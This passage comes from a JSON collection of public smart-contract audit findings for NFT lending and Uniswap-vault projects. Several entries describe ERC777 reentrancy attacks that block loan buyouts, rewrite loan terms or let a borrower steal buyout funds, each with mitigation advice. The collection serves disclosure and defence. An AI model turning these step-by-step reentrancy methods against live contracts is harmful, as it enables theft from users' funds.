Repay(loanId, msg.sender, lender, interest, loanAmount);\n        emit Close(loanId);\n    }\n```\n\nThe change is passing the provided test suite, and the `.gas-snapshot` reflected the change by reducing the gas costs from:\n\n```solidity\nNFTLoanFacilitatorGasBenchMarkTest:testRepayAndClose() (gas: 81320 -> 81064)\nNFTLoanFacilitatorTest:testRepayAndCloseSuccessful() (gas: 447725 -> 447469)\nNFTLoanFacilitatorTest:testRepayInterestOwedExceedingUint128() (gas: 465901 -> 465645)\n```",
    "dataSource": {
      "name": "code-423n4/2022-04-backed-findings",
      "repo": "https://github.com/code-423n4/2022-04-backed-findings",
      "url": "https://github.com/code-423n4/2022-04-backed-findings/issues/103"
    }
  },
  {
    "title": "When an attacker lends to a loan, the attacker can trigger DoS that any lenders can not buyout it",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-backed/blob/main/contracts/NFTLoanFacilitator.sol#L205-L208\nhttps://github.com/code-423n4/2022-04-backed/blob/main/contracts/NFTLoanFacilitator.sol#L215-L218\n\n\n# Vulnerability details\n\n## Impact\n\nIf an attacker (lender) lends to a loan, the attacker can always revert transactions when any lenders try to buyout, making anyone can not buyout the loan of the attacker.\n\n## Proof of Concept\n\n1. A victim calls `lend()`, trying to buyout the loan of the attacker.\n2. In `lend()`, it always call `ERC20(loanAssetContractAddress).safeTransfer` to send `accumulatedInterest + previousLoanAmount` to `currentLoanOwner` (attacker).\n3. If the `transfer` of `loanAssetContractAddress` is ERC777, it will call `_callTokensReceived` that the attacker can manipulate and always revert it.\n4. Because `NFTLoanFacilitator` uses `safeTransfer` and `safeTransferFrom` to check return value, the transaction of the victim will also be reverted. It makes anyone can not buyout the loan of the attacker.\n\nIn `_callTokensReceived`, the attacker just wants to revert the buyout transaction, but keep `repayAndCloseLoan` successful. The attacker can call `loanInfoStruct(uint256 loanId)` in `_callTokensReceived` to check if the value of `loanInfo` is changed or not to decide to revert it.\n\n## Tools Used\n\nvim\n\n## Recommended Mitigation Steps\n\nDon't transfer `ERC20(loanAssetContractAddress)` to `currentLoanOwner` in `lend()`, use a global mapping to record redemption of lenders and add an external function `redeem` for lenders to transfer `ERC20(loanAssetContractAddress)`.\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-backed-findings",
      "repo": "https://github.com/code-423n4/2022-04-backed-findings",
      "url": "https://github.com/code-423n4/2022-04-backed-findings/issues/89"
    }
  },
  {
    "title": "currentLoanOwner can manipulate loanInfo when any lenders try to buyout",
    "severity": "major",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-backed/blob/main/contracts/NFTLoanFacilitator.sol#L205-L208\nhttps://github.com/code-423n4/2022-04-backed/blob/main/contracts/NFTLoanFacilitator.sol#L215-L218\n\n\n# Vulnerability details\n\n## Impact\n\nIf an attacker already calls `lend()` to lend to a loan, the attacker can manipulate `loanInfo` by reentrancy attack when any lenders try to buyout. The attacker can set bad values of `lendInfo` (e.g. very long duration, and 0 interest rate) that the lender who wants to buyout don't expect.\n\n## Proof of Concept\n\nAn attacker lends a loan, and `loanAssetContractAddress` in `loanInfo` is ERC777 which is suffering from reentrancy attack. When a lender (victim) try to buyout the loan of the attacker:\n\n1. The victim called `lend()`.\n2. In `lend()`, it always call `ERC20(loanAssetContractAddress).safeTransfer` to send `accumulatedInterest + previousLoanAmount` to `currentLoanOwner` (attacker).\n3. The `transfer` of `loanAssetContractAddress` ERC777 will call `_callTokensReceived` so that the attacker can call `lend()` again in reentrancy with parameters:\n    * loanId: same loan Id\n    * interestRate: set to bad value (e.g. 0)\n    * amount: same amount\n    * durationSeconds: set to bad value (e.g. a long durationSeconds)\n    * sendLendTicketTo: same address of the attacker (`currentLoanOwner`)\n4. Now the variables in `loanInfo` are changed to bad value, and the victim will get the lend ticket but the loan term is manipulated, and can not set it back (because it requires a better term).\n\n## Tools Used\n\nvim\n\n## Recommended Mitigation Steps\n\nUse `nonReentrant` modifier on `lend()` to prevent reentrancy attack:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-backed-findings",
      "repo": "https://github.com/code-423n4/2022-04-backed-findings",
      "url": "https://github.com/code-423n4/2022-04-backed-findings/issues/88"
    }
  },
  {
    "title": "Borrower can be their own lender and steal funds from buyout due to reentrancy",
    "severity": "major",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L214-L221\nhttps://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L230-L250\n\n\n# Vulnerability details\n\n## Impact\nIf borrower lends their own loan, they can repay and close the loan before ownership of the lend ticket is transferred to the new lender. The borrower will keep the NFT + loan amount + accrued interest.\n\n## Proof of Concept\nThis exploit requires that the `loanAssetContractAddress` token transfers control to the receiver.\n\n### Steps of exploit:\n\n- Borrower creates loan with `createLoan()`.\n- The same Borrower calls `lend()`, funding their own loan. The Borrower receives the lend ticket, and funds are transferred to themself.\n- A new lender attempts to buy out the loan. The original loan amount + accruedInterest are sent to the original lender (same person as borrower).\n- Due to lack of checks-effects-interactions pattern, the borrower is able to immediately call `repayAndCloseLoan()` before the lend ticket is transferred to the new lender.\n\nThe following code illustrates that the new lender sends funds to the original lender prior to receiving the lend ticket in return.\n\n```\n            } else {\n                ERC20(loan.loanAssetContractAddress).safeTransferFrom(\n                    msg.sender,\n                    currentLoanOwner,\n                    accumulatedInterest + previousLoanAmount\n                );\n            }\n            ILendTicket(lendTicketContract).loanFacilitatorTransfer(currentLoanOwner, sendLendTicketTo, loanId);\n```\n\nThe original lender/borrower calls the following `repayAndCloseLoan()` function so that they receive their collateral NFT from the protocol.\n\n```\n    function repayAndCloseLoan(uint256 loanId) external override notClosed(loanId) {\n        Loan storage loan = loanInfo[loanId];\n\n\n        uint256 interest = _interestOwed(\n            loan.loanAmount,\n            loan.lastAccumulatedTimestamp,\n            loan.perAnumInterestRate,\n            loan.accumulatedInterest\n        );\n        address lender = IERC721(lendTicketContract).ownerOf(loanId);\n        loan.closed = true;\n        ERC20(loan.loanAssetContractAddress).safeTransferFrom(msg.sender, lender, interest + loan.loanAmount);\n        IERC721(loan.collateralContractAddress).safeTransferFrom(\n            address(this),\n            IERC721(borrowTicketContract).ownerOf(loanId),\n            loan.collateralTokenId\n        );\n\n\n        emit Repay(loanId, msg.sender, lender, interest, loan.loanAmount);\n        emit Close(loanId);\n    }\n```\n\nFinally, the new lender receives the lend ticket that has no utility at this point. The borrower now possesses the NFT, original loan amount, and accrued interest.\n\n## Tools Used\nManual review.\n\n## Recommended Mitigation Steps\nMove the line to transfer the lend ticket to the new lender above the line to transfer to funds to the original lender. Or, use reentrancyGuard from OpenZeppelin to remove the risk of reentrant calls completely.\n\nIf desired, also require that the lender cannot be the same account as the borrower of a loan.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-backed-findings",
      "repo": "https://github.com/code-423n4/2022-04-backed-findings",
      "url": "https://github.com/code-423n4/2022-04-backed-findings/issues/85"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n1. Open TODOS\n\nConsider resolving the TODOs before deploying.\n\n```solidity\ncompound_rari_fork/Comptroller.sol:1012:        // TODO: custom liquidation incentive for LP shares\nvault_and_oracles/UniV3LpVault.sol:142:        // TODO: do we want some Comptroller like error handling/messaging here?\nvault_and_oracles/UniV3LpVault.sol:166:    // TODO: do we want a \"decreaseLiquidityAndCollect\" function?\n```\n\n2. `CErc20.sol:initialize()` is front-runnable\n\n3. `approve` should be replaced with `safeApprove`\n\n`approve` is subject to a known front-running attack. Consider using `safeApprove` instead:\n\n```solidity\nvault_and_oracles/FlashLoan.sol:48:        IERC20(assets[0]).approve(address(LP_VAULT), amounts[0]);\nvault_and_oracles/FlashLoan.sol:58:        IERC20(assets[0]).approve(address(LENDING_POOL), amountOwing);\nvault_and_oracles/UniV3LpVault.sol:418:            IERC20Detailed(params.asset).approve(msg.sender, owedBack);\nvault_and_oracles/UniV3LpVault.sol:533:        IERC20Detailed(params.underlying).approve(address(params.debtCToken), params.repayAmount);\nvault_and_oracles/UniV3LpVault.sol:536:        IERC20Detailed(params.underlying).approve(address(params.debtCToken), 0);\nvault_and_oracles/UniV3LpVault.sol:622:        IERC20Detailed(swapPath.toAddress(0)).approve(address(swapRouter), amount);\nvault_and_oracles/UniV3LpVault.sol:626:        IERC20Detailed(swapPath.toAddress(0)).approve(address(swapRouter), 0);\nvault_and_oracles/UniV3LpVault.sol:650:        IERC20Detailed(token0).approve(address(nonfungiblePositionManager), amount0);\nvault_and_oracles/UniV3LpVault.sol:651:        IERC20Detailed(token1).approve(address(nonfungiblePositionManager), amount1);\nvault_and_oracles/UniV3LpVault.sol:665:        IERC20Detailed(token0).approve(address(nonfungiblePositionManager), 0);\nvault_and_oracles/UniV3LpVault.sol:666:        IERC20Detailed(token1).approve(address(nonfungiblePositionManager), 0);\nvault_and_oracles/UniV3LpVault.sol:704:        IERC20Detailed(params.token0).approve(address(nonfungiblePositionManager), params.amount0Desired);\nvault_and_oracles/UniV3LpVault.sol:705:        IERC20Detailed(params.token1).approve(address(nonfungiblePositionManager), params.amount1Desired);\nvault_and_oracles/UniV3LpVault.sol:723:        IERC20Detailed(params.token0).approve(address(nonfungiblePositionManager), 0);\nvault_and_oracles/UniV3LpVault.sol:724:        IERC20Detailed(params.token1).approve(address(nonfungiblePositionManager), 0);\n```\n\n4. Immutable addresses should be 0-checked\n\nConsider adding an `address(0)` check here:\n\n```solidity\nvault_and_oracles/FlashLoan.sol:20:    ILendingPoolAddressesProvider public immutable override ADDRESSES_PROVIDER;\nvault_and_oracles/FlashLoan.sol:21:    ILendingPool public immutable override LENDING_POOL;\nvault_and_oracles/FlashLoan.sol:22:    IUniV3LpVault public immutable LP_VAULT;\nvault_and_oracles/MasterPriceOracle.sol:13:    address public immutable WETH_ADDRESS;\nvault_and_oracles/UniswapTwapOracle.sol:31:    address public immutable WETH_ADDRESS;\nvault_and_oracles/UniswapTwapOracle.sol:36:    address public immutable nfpManager;\nvault_and_oracles/UniswapTwapOracle.sol:41:    address public immutable factory;\n```\n\n5. Missing comments\n\nThe following comments are missing (see `@audit` tags):\n\n```solidity\ncontracts/compound_rari_fork/Comptroller.sol:\n   471:      * @param repayAmount The amount of underlying being repaid //@audit missing @return uint256\n   521:      * @param repayAmount The amount of underlying being repaid //@audit missing @return uint256\n   573:      * @param seizeTokens The number of collateral tokens to seize //@audit missing @return uint256\n   692:      * @return (possible error code (semi-opaque), //@audit missing @param account\n   717:      * @return (possible error code, //@audit missing @param account\n  1062:      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details) //@audit missing @param newOracle\n  1103:      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details) //@audit missing @param newVault\n  1518:      * @param cToken The market to check if deprecated //@audit missing @return bool\n\ncontracts/compound_rari_fork/CToken.sol:\n    24:      * @param decimals_ EIP-20 decimal precision of this token //@audit missing @param reserveFactorMantissa_\n  1399:      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details) //@audit missing @param newComptroller\n  1418:      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details) //@audit missing @param newReserveFactorMantissa\n  1433:      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)  //@audit missing @param newReserveFactorMantissa\n  1711:      * @param errorMessage The revert string to return on failure. //@audit missing @param target //@audit missing @return bytes\n\ncontracts/libs/LiquidityLibrary.sol:\n  23:      * @param _tick current price tick used for calculation  //@audit missing @param _liquidity\n\ncontracts/libs/LpBreakdownLibrary.sol:\n   34:      * @param isTwap Whether to use a TWAP or instantaneous tick for calculations  //@audit missing @param * 3 addresses\n   86:      * @param tokenId The tokenId to generate position information of  //@audit missing @param * 2 addresses\n  123:      * @param vars The in-memory struct containing all most recently updated information about our tokenId  //@audit missing @param tick\n\ncontracts/libs/UniswapTwapLibrary.sol:\n  32:      * @param _period number of seconds in the past to start calculating time-weighted average  //@audit missing @param _checkPeriod\n\ncontracts/vault_and_oracles/MasterPriceOracle.sol:\n   33:      * @param _oracles The `PriceOracle` contracts to be assigned to `underlyings`. //@audit missing @param _wethAddress\n  103:      * @return Price in ETH of the token underlying `cToken`, scaled by `10 ** (36 - underlyingDecimals)`. //@audit missing @param cToken \n\ncontracts/vault_and_oracles/UniswapTwapOracle.sol:\n   68:      * @param _canAdminOverwrite Controls if `admin` can overwrite existing assignments of pools to tokens.  //@audit missing @param * 3\n  111:      * @return Price in ETH of the token underlying `cToken`, scaled by `10 ** (36 - underlyingDecimals)`.  //@audit missing @param cToken\n\n```\n\n6. Avoid floating pragmas: the versions should be locked in the solution (`0.5.16` and `0.7.6`)\n\n7. `require()` should be used for checking error conditions on inputs and return values while `assert()` should be used for invariant checking\n\nProperly functioning code should **never** reach a failing assert statement, unless there is a bug in your contract you should fix. Here, I believe the assert should be a require or a revert:\n\n```solidity\ncompound_rari_fork/Comptroller.sol:214:        assert(assetIndex < len);\ncompound_rari_fork/Comptroller.sol:273:            assert(markets[cToken].accountMembership[minter]);\ncompound_rari_fork/Comptroller.sol:403:            assert(markets[cToken].accountMembership[borrower]);\ncompound_rari_fork/Comptroller.sol:1310:        assert(assetIndex < len);\nvault_and_oracles/UniswapTwapOracle.sol:196:        assert(isSupportedPool[referencePools[token]]);\nvault_and_oracles/UniV3LpVault.sol:778:        assert(assetIndex < len);\n```\n\nAdditionally, as the Solidity versions are < 0.8.0, the remaining gas would be consumed instead of being refunded in case of failure.\n\n8. Comment says \"public\" instead of \"external\" :\n\n```solidity\nFile: CErc20.sol\n137:     /**\n138:      * @notice A public function to sweep accidental ERC-20 transfers to this contract. Tokens are sent to admin //@audit should say \"An external function\"\n139:      * @param token The address of the ERC-20 token to sweep\n140:      */\n141:     function sweepToken(EIP20NonStandardInterface token) external {\n```\n\n9. `UniswapTwapLibrary.sol:getTimeWeightedAverageTickSafe()` declares a named returns but then are uses a return statement. I suggest choosing only one for readability reasons.\n\n```solidity\nFile: UniswapTwapLibrary.sol\n87:     function getTimeWeightedAverageTickSafe(address _pool, uint32 _period)\n88:         internal\n89:         view\n90:         returns (int24 timeWeightedAverageTick) //@audit unused named returns\n91:     {\n92:         uint32 maxPeriod = _getMaxPeriod(_pool);\n93:         uint32 requestPeriod = _period > maxPeriod ? maxPeriod : _period;\n94:         return OracleLibrary.consultAtHistoricTime(_pool, requestPeriod, 0);\n95:     }\n```\n\n10. Style: No need to initialize variables with default values\nIf a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern.\n\n```solidity\ncompound_rari_fork/Comptroller.sol:119:        for (uint256 i = 0; i < len; i++) {\ncompound_rari_fork/Comptroller.sol:206:        for (uint256 i = 0; i < len; i++) {\ncompound_rari_fork/Comptroller.sol:768:        for (uint256 i = 0; i < userTokensLength; i++) {\ncompound_rari_fork/Comptroller.sol:846:        for (uint256 i = 0; i < assets.length; i++) {\ncompound_rari_fork/Comptroller.sol:1302:        for (uint256 i = 0; i < len; i++) {\ncompound_rari_fork/Comptroller.sol:1339:        for (uint256 i = 0; i < numMarkets; i++) {\ncompound_rari_fork/Comptroller.sol:1362:        for (uint256 i = 0; i < numMarkets; i++) {\ncompound_rari_fork/Comptroller.sol:1471:        for (uint256 i = 0; i < pools.length; i++) {\ncompound_rari_fork/Comptroller.sol:1490:        for (uint256 i = 0; i < pools.length; i++) {\ncompound_rari_fork/CToken.sol:93:        uint256 startingAllowance = 0;\nvault_and_oracles/MasterPriceOracle.sol:51:        for (uint256 i = 0; i < underlyings.length; i++) oracles[underlyings[i]] = _oracles[i];\nvault_and_oracles/MasterPriceOracle.sol:68:        for (uint256 i = 0; i < underlyings.length; i++) {\nvault_and_oracles/UniswapTwapOracle.sol:87:        for (uint256 i = 0; i < _tokens.length; i++) {\nvault_and_oracles/UniswapTwapOracle.sol:209:        for (uint256 i = 0; i < tokens.length; i++) {\nvault_and_oracles/UniswapTwapOracle.sol:220:            isSupportedPool[referencePools[tokens[i]]] = false;\nvault_and_oracles/UniV3LpVault.sol:466:        uint16 referralCode = 0;\nvault_and_oracles/UniV3LpVault.sol:770:        for (uint256 i = 0; i < len; i++) {\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-04-dualityfocus-findings",
      "repo": "https://github.com/code-423n4/2022-04-dualityfocus-findings",
      "url": "https://github.com/code-423n4/2022-04-dualityfocus-findings/issues/43"
    }
  },
  {
    "title": "QA Report",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/FlashLoan.sol#L57\n\n\n# Vulnerability details\n\n## Impact\nThe `FlashLoan.recoverToken` function does not check the return value of the transferFrom function executed on a provided token.\n\nThe `IERC20.transferFrom()` function return a boolean value indicating success. This parameter needs to be checked for success. Some tokens do not revert if the transfer failed but return false instead.\n\nTokens that don’t actually perform the transfer and return false are still counted as a correct transfer. Furthermore, tokens that do not correctly implement the EIP20 standard, like USDT which does not return a success boolean, will revert.\n\n## Proof of Concept\n* https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/FlashLoan.sol#L57\n\n## Tools Used\nSlither\n\n## Recommended Mitigation Steps\nIt is recommended to use OpenZeppelin’s `SafeERC20` with the `safeTransferFrom` function that handles the return value check as well as non-standard-compliant tokens.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-dualityfocus-findings",
      "repo": "https://github.com/code-423n4/2022-04-dualityfocus-findings",
      "url": "https://github.com/code-423n4/2022-04-dualityfocus-findings/issues/41"
    }
  },
  {
    "title": "Not calling `approve(0)` before setting a new approval causes the call to revert when used with Tether (USDT)",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/FlashLoan.sol#L48\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/FlashLoan.sol#L58\nhttps://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L418\n\n\n# Vulnerability details\n\nSome tokens do not implement the ERC20 standard properly but are still accepted by most code that accepts ERC20 tokens.  For example Tether (USDT)'s `approve()` function will revert if the current approval is not zero, to protect against front-running changes of approvals.\n\n## Impact\nThe code as currently implemented does not handle these sorts of tokens properly when they're a Uniswap pool asset, which would prevent USDT, the sixth largest pool, from being used by this project. This project relies heavily on Uniswap, so this would hamper future growth and availability of the protocol.\n\n## Proof of Concept\n\n1. File: contracts/vault_and_oracles/FlashLoan.sol (line [48](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/FlashLoan.sol#L48))\n```solidity\n        IERC20(assets[0]).approve(address(LP_VAULT), amounts[0]);\n```\n\n2. File: contracts/vault_and_oracles/FlashLoan.sol (line [58](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/FlashLoan.sol#L58))\n```solidity\n        IERC20(assets[0]).approve(address(LENDING_POOL), amountOwing);\n```\n\n3. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [418](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L418))\n```solidity\n            IERC20Detailed(params.asset).approve(msg.sender, owedBack);\n```\n\nThere are other calls to `approve()`, but they correctly set the approval to zero after the transfer is done, so that the next approval can go through.\n\n## Tools Used\nCode inspection\n\n## Recommended Mitigation Steps\nUse OpenZeppelin’s `SafeERC20`'s `safeTransfer()` instead\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-dualityfocus-findings",
      "repo": "https://github.com/code-423n4/2022-04-dualityfocus-findings",
      "url": "https://github.com/code-423n4/2022-04-dualityfocus-findings/issues/39"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low Risk Issues\n\n### `approve()` return value not checked\nCheck the result, or use `safeApprove()`\n```\ncontracts/vault_and_oracles/UniV3LpVault.sol:418:            IERC20Detailed(params.asset).approve(msg.sender, owedBack);\ncontracts/vault_and_oracles/UniV3LpVault.sol:533:        IERC20Detailed(params.underlying).approve(address(params.debtCToken), params.repayAmount);\ncontracts/vault_and_oracles/UniV3LpVault.sol:536:        IERC20Detailed(params.underlying).approve(address(params.debtCToken), 0);\ncontracts/vault_and_oracles/UniV3LpVault.sol:622:        IERC20Detailed(swapPath.toAddress(0)).approve(address(swapRouter), amount);\ncontracts/vault_and_oracles/UniV3LpVault.sol:626:        IERC20Detailed(swapPath.toAddress(0)).approve(address(swapRouter), 0);\ncontracts/vault_and_oracles/UniV3LpVault.sol:650:        IERC20Detailed(token0).approve(address(nonfungiblePositionManager), amount0);\ncontracts/vault_and_oracles/UniV3LpVault.sol:651:        IERC20Detailed(token1).approve(address(nonfungiblePositionManager), amount1);\ncontracts/vault_and_oracles/UniV3LpVault.sol:665:        IERC20Detailed(token0).approve(address(nonfungiblePositionManager), 0);\ncontracts/vault_and_oracles/UniV3LpVault.sol:666:        IERC20Detailed(token1).approve(address(nonfungiblePositionManager), 0);\ncontracts/vault_and_oracles/UniV3LpVault.sol:704:        IERC20Detailed(params.token0).approve(address(nonfungiblePositionManager), params.amount0Desired);\ncontracts/vault_and_oracles/UniV3LpVault.sol:705:        IERC20Detailed(params.token1).approve(address(nonfungiblePositionManager), params.amount1Desired);\ncontracts/vault_and_oracles/UniV3LpVault.sol:723:        IERC20Detailed(params.token0).approve(address(nonfungiblePositionManager), 0);\ncontracts/vault_and_oracles/UniV3LpVault.sol:724:        IERC20Detailed(params.token1).approve(address(nonfungiblePositionManager), 0);\ncontracts/vault_and_oracles/FlashLoan.sol:48:        IERC20(assets[0]).approve(address(LP_VAULT), amounts[0]);\ncontracts/vault_and_oracles/FlashLoan.sol:58:        IERC20(assets[0]).approve(address(LENDING_POOL), amountOwing);\n```\n\n### `require()` should be used instead of `assert()`\n\n1. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [778](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L778))\n```solidity\n        assert(assetIndex < len);\n```\n2. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [196](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L196))\n```solidity\n        assert(isSupportedPool[referencePools[token]]);\n```\n3. File: contracts/compound_rari_fork/Comptroller.sol (line [214](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L214))\n```solidity\n        assert(assetIndex < len);\n```\n4. File: contracts/compound_rari_fork/Comptroller.sol (line [273](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L273))\n```solidity\n            assert(markets[cToken].accountMembership[minter]);\n```\n5. File: contracts/compound_rari_fork/Comptroller.sol (line [403](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L403))\n```solidity\n            assert(markets[cToken].accountMembership[borrower]);\n```\n6. File: contracts/compound_rari_fork/Comptroller.sol (line [1310](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1310))\n```solidity\n        assert(assetIndex < len);\n```\n\n### Missing checks for `address(0x0)` when assigning values to `address` state variables\n\n1. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [65](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L65))\n```solidity\n        factory = _factory;\n```\n2. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [93](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L93))\n```solidity\n        WETH_ADDRESS = _wethAddress;\n```\n3. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [94](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L94))\n```solidity\n        nfpManager = _nfpManager;\n```\n4. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [95](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L95))\n```solidity\n        factory = _factory;\n```\n5. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [96](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L96))\n```solidity\n        admin = _admin;\n```\n6. File: contracts/vault_and_oracles/MasterPriceOracle.sol (line [52](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/MasterPriceOracle.sol#L52))\n```solidity\n        WETH_ADDRESS = _wethAddress;\n```\n7. File: contracts/vault_and_oracles/MasterPriceOracle.sol (line [53](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/MasterPriceOracle.sol#L53))\n```solidity\n        admin = _admin;\n```\n8. File: contracts/vault_and_oracles/MasterPriceOracle.sol (line [83](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/MasterPriceOracle.sol#L83))\n```solidity\n        admin = newAdmin;\n```\n\n### Open TODOs\nCode architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment\n\n1. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [142](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L142))\n```solidity\n        // TODO: do we want some Comptroller like error handling/messaging here?\n```\n2. File: contracts/vault_and_oracles/UniV3LpVault.sol (line [166](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniV3LpVault.sol#L166))\n```solidity\n    // TODO: do we want a \"decreaseLiquidityAndCollect\" function?\n```\n3. File: contracts/vault_and_oracles/UniswapTwapOracle.sol (line [53](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/vault_and_oracles/UniswapTwapOracle.sol#L53))\n```solidity\n    // period used to calculate our TWAPs, in TODO units\n```\n4. File: contracts/compound_rari_fork/Comptroller.sol (line [1012](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L1012))\n```solidity\n        // TODO: custom liquidation incentive for LP shares\n```\n\n## Non-critical Issues\n\n\n### `public` functions not called by the contract should be declared `external` instead\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n1. File: contracts/compound_rari_fork/CToken.sol (lines [26-33](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CToken.sol#L26-L33))\n```solidity\n    function initialize(\n        ComptrollerInterface comptroller_,\n        InterestRateModel interestRateModel_,\n        uint256 initialExchangeRateMantissa_,\n        string memory name_,\n        string memory symbol_,\n        uint8 decimals_,\n        uint256 reserveFactorMantissa_\n```\n2. File: contracts/compound_rari_fork/CToken.sol (line [1580](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/CToken.sol#L1580))\n```solidity\n    function _setInterestRateModel(InterestRateModel newInterestRateModel) public returns (uint256) {\n```\n3. File: contracts/compound_rari_fork/Comptroller.sol (line [115](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L115))\n```solidity\n    function enterMarkets(address[] memory cTokens) public returns (uint256[] memory) {\n```\n4. File: contracts/compound_rari_fork/Comptroller.sol (lines [696-702](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L696-L702))\n```solidity\n    function getAccountLiquidity(address account)\n        public\n        view\n        returns (\n            uint256,\n            uint256,\n            uint256\n```\n5. File: contracts/compound_rari_fork/Comptroller.sol (lines [743-754](https://github.com/code-423n4/2022-04-dualityfocus/blob/f21ef7708c9335ee1996142e2581cb8714a525c9/contracts/compound_rari_fork/Comptroller.sol#L743-L754))\n```solidity\n    function getHypotheticalAccountLiquidity(\n        address account,\n        address cTokenModify,\n        uint256 redeemTokens,\n        uint256 borrowAmount\n    )\n        public\n        